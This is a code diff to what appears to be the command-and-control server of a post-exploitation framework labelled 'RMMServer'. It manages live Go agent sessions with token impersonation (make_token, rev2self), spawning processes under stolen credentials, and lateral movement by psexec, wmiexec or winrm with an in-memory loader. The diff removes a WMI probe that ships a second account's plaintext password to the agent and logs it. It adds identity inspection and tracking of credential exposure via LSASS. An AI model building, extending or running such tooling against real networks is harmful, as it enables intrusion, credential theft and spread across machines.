@@ -131,13 +131,8 @@ MAKE_TOKEN_OK_PREFIXES = ("token created:", "token replaced:")
 # is running. __UID__ reports the process and network identities.
 LATERAL_COMMAND = "__LATERAL__"
 UID_COMMAND = "__UID__"
+UIDX_COMMAND = "__UIDX__"
 WHOAMI_COMMAND = "__WHOAMI__"
-# WMI probe: the Go agent answers __WMI_PROBE__ with a stage-by-stage report
-# of the requested lifecycle comparison. The switch mode's account-B
-# credentials ride the beacon command's JSON body like __MAKE_TOKEN__'s;
-# operator events retain the supplied credentials for command history.
-WMI_PROBE_COMMAND = "__WMI_PROBE__"
-WMI_PROBE_MODES = frozenset({"held", "cycled", "switch"})
 LATERAL_METHODS = frozenset({"psexec", "wmiexec", "winrm"})
 # Single-loader release: csharp deploys in memory; powershell stays a
 # reserved value on every surface so a later release ships without an API
@@ -3225,10 +3220,24 @@ class RMMServer:
                    "spawn_pid": int(match.group("pid")) if acknowledged else None,
                    "spawn_output": output, "launch_status": "acknowledged" if acknowledged else "inconclusive",
                    "submission_status": status}
-        context = re.search(r"^spawn method=(CreateProcessAsUser|CreateProcessWithTokenW|CreateProcessWithLogonW|CreateProcessA) identity_degraded=(true|false)$", output, re.MULTILINE)
+        # Parse the enriched spawn method line: method, identity_degraded, echelon, credential_exposure, identity.
+        context = re.search(
+            r"^spawn method=(CreateProcessAsUser|CreateProcessWithTokenW|CreateProcessWithLogonW|CreateProcessA)"
+            r" identity_degraded=(true|false)"
+            r"(?: echelon=([1-4]))?"
+            r"(?: credential_exposure=(none|lsass|agent))?$",
+            output, re.MULTILINE)
         if acknowledged and context:
             payload["spawn_method"] = context.group(1)
             payload["identity_degraded"] = context.group(2) == "true"
+            if context.group(3):
+                payload["spawn_echelon"] = int(context.group(3))
+            if context.group(4):
+                payload["credential_exposure"] = context.group(4)
+        # Parse spawn identity (network identity of the child).
+        identity_match = re.search(r"^spawn identity=(.{1,256})$", output, re.MULTILINE)
+        if acknowledged and identity_match:
+            payload["spawn_network_identity"] = identity_match.group(1)
         for line in output.splitlines():
             if not line.startswith("spawn diagnostics=") or len(line) > 16384:
                 continue
@@ -3253,9 +3262,11 @@ class RMMServer:
             for key in ("active_token", "credentials_available"):
                 if type(diagnostics.get(key)) is bool:
                     detail[key] = diagnostics[key]
-            for key in ("process_identity", "token_type"):
+            for key in ("process_identity", "network_identity", "token_type", "credential_exposure"):
                 if isinstance(diagnostics.get(key), str):
                     detail[key] = diagnostics[key][:256]
+            if type(diagnostics.get("echelon")) is int and 1 <= diagnostics["echelon"] <= 4:
+                detail["echelon"] = diagnostics["echelon"]
             if type(diagnostics.get("creation_flags")) is int and 0 <= diagnostics["creation_flags"] <= 0xffffffff:
                 detail["creation_flags"] = diagnostics["creation_flags"]
             for key in ("process_privileges", "token_privileges"):
@@ -3330,59 +3341,6 @@ class RMMServer:
         body = str((event or {}).get("body") or "").strip()
         return {"ok": body == "no token active" or body.startswith("token reverted:"),
                 "session_id": session.id, "output": body}, "ok"
-
-    def wmi_probe(self, session_id_or_prefix, host, mode="", b_domain="", b_user="", b_password="", timeout=120.0):
-        """Run the read-only WMI lifecycle diagnostic on a live Go session.
-
-        The probe performs read-only WMI connections under the active
-        make_token state and never deploys anything. The switch mode's
-        account-B credentials travel to the agent inside the beacon
-        command's JSON body, which lives only in the in-memory command
-        queue; operator events retain the supplied credentials.
-        """
-        session = self.resolve_session(session_id_or_prefix)
-        if not session:
-            return None, "not_found"
-        if (getattr(session, "agent_type", "") or "").strip().lower() != "go":
-            return None, "agent_type_unsupported"
-        host = (host or "").strip()
-        if not host:
-            return None, "invalid_host"
-        mode = (mode or "").strip().lower()
-        if mode and mode not in WMI_PROBE_MODES:
-            return None, "invalid_mode"
-        b_domain = str(b_domain or "").strip()
-        b_user = str(b_user or "").strip()
-        b_password = str(b_password or "")
-        if b_domain or b_user or b_password:
-            if mode != "switch":
-                return None, "invalid_identity_method"
-            if not b_user:
-                return None, "invalid_identity"
-            if "\\" in b_user and b_domain:
-                return None, "invalid_identity"
-            if "\\" in b_user:
-                b_domain, b_user = (part.strip() for part in b_user.split("\\", 1))
-                if not b_user:
-                    return None, "invalid_identity"
-        command = WMI_PROBE_COMMAND + " " + host + (f" {mode}" if mode else "")
-        b_label = ""
-        if b_user:
-            command += "\n" + json.dumps(
-                {"domain": b_domain, "user": b_user, "password": b_password},
-                separators=(",", ":"),
-            )
-            b_label = (b_domain + "\\" if b_domain else "") + b_user
-        self.record_operator_action(
-            session,
-            f"{WMI_PROBE_COMMAND} {host}" + (f" {mode}" if mode else "") + (f" b_identity={b_label} b_password={json.dumps(b_password, ensure_ascii=False)}" if b_user else ""),
-            "wmi_probe",
-        )
-        event, status = self.exec_and_wait(session.id, command, timeout=timeout)
-        if status != "ok":
-            return None, status
-        body = str((event or {}).get("body") or "").strip()
-        return {"ok": body.startswith("wmi probe host="), "session_id": session.id, "output": body}, "ok"
 
     def spawnas(self, session_id_or_prefix, workspace_dir, domain, user, password,
                 verify=True, spawn_timeout=120.0, register_timeout=60.0, verify_timeout=120.0):
@@ -3491,7 +3449,7 @@ class RMMServer:
         body = str((event or {}).get("body") or "").strip()
         return {"ok": True, "session_id": session.id, "identity": identity, "output": body}, "ok"
 
-    def lateral_move(self, session_id_or_prefix, method, host, verify=True, direct_wbem=False,
+    def lateral_move(self, session_id_or_prefix, method, host, verify=True,
                      exec_timeout=300.0, register_timeout=60.0, verify_timeout=120.0, https=False, insecure=False,
                      loader="csharp", independent=True, identity_domain="", identity_user="", identity_password=""):
         """Request remote execution using the source agent's compiled debug mode.
@@ -3537,8 +3495,6 @@ class RMMServer:
             return None, "invalid_https"
         if not isinstance(insecure, bool) or (insecure and not https):
             return None, "invalid_insecure"
-        if not isinstance(direct_wbem, bool) or (direct_wbem and method != "wmiexec"):
-            return None, "invalid_direct_wbem"
         # Independent lifetime is a winrm-scoped option: it re-stages the
         # deployment through a local WMI process so the target escapes the
         # shell job and the source closes the session after readiness.
@@ -3615,7 +3571,6 @@ class RMMServer:
             **({"loader": "csharp"} if method != "psexec" else {}),
             **({"payload_sha256": payload_sha256} if method != "psexec" else {}),
             **({"https": True} if https else {}), **({"insecure": True} if insecure else {}),
-            **({"direct_wbem": True} if direct_wbem else {}),
             **({"identity": {"domain": identity_domain, "user": identity_user,
                              "password": str(identity_password or "")}} if identity_user else {})}, separators=(",", ":"))
         identity_label = (identity_domain + "\\" if identity_domain else "") + identity_user
@@ -4158,6 +4113,20 @@ class RMMServer:
             return None, "agent_type_unsupported"
         self.record_operator_action(session, UID_COMMAND, "uid")
         event, status = self.exec_and_wait(session.id, UID_COMMAND, timeout=timeout)
+        if status != "ok":
+            return None, status
+        body = str((event or {}).get("body") or "").strip()
+        return {"ok": True, "session_id": session.id, "output": body}, "ok"
+
+    def session_uidx(self, session_id_or_prefix, timeout=120.0):
+        """Extended identity inspection: process identity, network identity, logon session type, identity split."""
+        session = self.resolve_session(session_id_or_prefix)
+        if not session:
+            return None, "not_found"
+        if (getattr(session, "agent_type", "") or "").strip().lower() != "go":
+            return None, "agent_type_unsupported"
+        self.record_operator_action(session, UIDX_COMMAND, "uidx")
+        event, status = self.exec_and_wait(session.id, UIDX_COMMAND, timeout=timeout)
         if status != "ok":
             return None, status
         body = str((event or {}).get("body") or "").strip()
@@ -6092,60 +6061,6 @@ class RMMHandler(BaseHTTPRequestHandler):
                 self._json(200, result)
             return True
 
-        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "wmi-probe":
-            session = _resolve_api_session(self, parts[1])
-            if not session:
-                self._json(404, {"error": "session_not_found"})
-                return True
-            try:
-                timeout = float(body.get("timeout", 120))
-                if not 1 <= timeout <= 3600:
-                    raise ValueError("timeout must be between 1 and 3600 seconds")
-            except (TypeError, ValueError):
-                self._json(400, {"error": "invalid_wmi_probe_options"})
-                return True
-            b_domain = str(body.get("b_domain") or "")
-            b_user = str(body.get("b_user") or "")
-            b_password = str(body.get("b_password") or "")
-            cred_id = str(body.get("b_cred_id") or "").strip()
-            if cred_id and (b_domain or b_user or b_password):
-                self._json(400, {"error": "invalid_identity",
-                                 "detail": "Use either b_cred_id or the b_* credential fields, not both."})
-                return True
-            if cred_id:
-                owner = getattr(session, "workspace_id", None) or ""
-                try:
-                    cred = _rmm_creds.creds_resolve(plugin_directory(owner), cred_id)
-                except (OSError, ValueError):
-                    self._json(503, {"error": "credential_store_unavailable"})
-                    return True
-                if cred is None:
-                    self._json(404, {"error": "cred_not_found", "cred_id": cred_id})
-                    return True
-                b_domain, b_user, b_password = cred["domain"], cred["user"], cred["password"]
-            result, status = srv.wmi_probe(
-                session.id,
-                str(body.get("host") or ""),
-                str(body.get("mode") or ""),
-                b_domain, b_user, b_password,
-                timeout=timeout,
-            )
-            if status == "not_found":
-                self._json(404, {"error": "session_not_found"})
-            elif status in ("agent_type_unsupported", "session_busy"):
-                self._json(409, {"error": status})
-            elif status in ("invalid_host", "invalid_mode", "invalid_identity", "invalid_identity_method", "invalid_direct_wbem"):
-                self._json(400, {"error": status})
-            elif status == "session_killed":
-                self._json(410, {"error": status})
-            elif status == "server_stopped":
-                self._json(503, {"error": status})
-            elif status == "timeout":
-                self._json(408, {"error": status, "command": WMI_PROBE_COMMAND})
-            else:
-                self._json(200, result)
-            return True
-
         if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "rev2self":
             session = _resolve_api_session(self, parts[1])
             if not session:
@@ -6330,7 +6245,6 @@ class RMMHandler(BaseHTTPRequestHandler):
                 exec_timeout = float(body.get("exec_timeout", 300))
                 https = body.get("https", False)
                 insecure = body.get("insecure", False)
-                direct_wbem = body.get("direct_wbem", False)
                 independent = body.get("independent", True)
                 loader = body.get("loader", "csharp")
                 register_timeout = float(body.get("register_timeout", 60))
@@ -6344,8 +6258,6 @@ class RMMHandler(BaseHTTPRequestHandler):
                     raise ValueError("https must be a boolean")
                 if not isinstance(insecure, bool):
                     raise ValueError("insecure must be a boolean")
-                if not isinstance(direct_wbem, bool):
-                    raise ValueError("direct_wbem must be a boolean")
                 if not isinstance(independent, bool):
                     raise ValueError("independent must be a boolean")
                 if not isinstance(loader, str):
@@ -6389,7 +6301,6 @@ class RMMHandler(BaseHTTPRequestHandler):
                 identity_password=identity_password,
                 **({"https": True} if https else {}),
                 **({"insecure": True} if insecure else {}),
-                **({"direct_wbem": True} if direct_wbem else {}),
             )
             if status == "not_found":
                 self._json(404, {"error": "session_not_found"})
@@ -6397,7 +6308,7 @@ class RMMHandler(BaseHTTPRequestHandler):
                 self._json(409, {"error": status})
             elif status in ("invalid_method", "invalid_host", "invalid_https",
                             "invalid_insecure", "invalid_loader", "invalid_independent",
-                            "invalid_identity", "invalid_identity_method", "invalid_direct_wbem"):
+                            "invalid_identity", "invalid_identity_method"):
                 self._json(400, {"error": status})
             elif status == "loader_reserved":
                 self._json(400, {"error": status,
@@ -6496,6 +6407,33 @@ class RMMHandler(BaseHTTPRequestHandler):
                 self._json(503, {"error": status})
             elif status == "timeout":
                 self._json(408, {"error": status, "command": UID_COMMAND})
+            else:
+                self._json(200, result)
+            return True
+
+        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "uidx":
+            session = _resolve_api_session(self, parts[1])
+            if not session:
+                self._json(404, {"error": "session_not_found"})
+                return True
+            try:
+                timeout = float(body.get("timeout", 120))
+                if not 1 <= timeout <= 3600:
+                    raise ValueError("timeout must be between 1 and 3600 seconds")
+            except (TypeError, ValueError):
+                self._json(400, {"error": "invalid_uidx_options"})
+                return True
+            result, status = srv.session_uidx(session.id, timeout=timeout)
+            if status == "not_found":
+                self._json(404, {"error": "session_not_found"})
+            elif status in ("agent_type_unsupported", "session_busy"):
+                self._json(409, {"error": status})
+            elif status == "session_killed":
+                self._json(410, {"error": status})
+            elif status == "server_stopped":
+                self._json(503, {"error": status})
+            elif status == "timeout":
+                self._json(408, {"error": status, "command": UIDX_COMMAND})
             else:
                 self._json(200, result)
             return True
